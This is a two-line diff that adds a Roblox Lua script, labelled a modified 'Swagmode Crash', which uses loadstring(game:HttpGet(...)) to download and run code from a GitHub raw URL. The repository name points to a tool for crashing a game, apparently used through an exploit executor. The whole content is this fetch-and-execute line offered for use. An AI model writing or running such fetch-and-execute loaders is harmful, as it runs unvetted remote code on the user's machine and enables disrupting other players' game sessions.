@@ -1,0 +1,2 @@
+--Swagmode Crash Modified by me for better performance
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GS21Official/DH-TB-Crash/main/Swagmode%20crash%20modified%20(better%20FPS)%20crash"))()
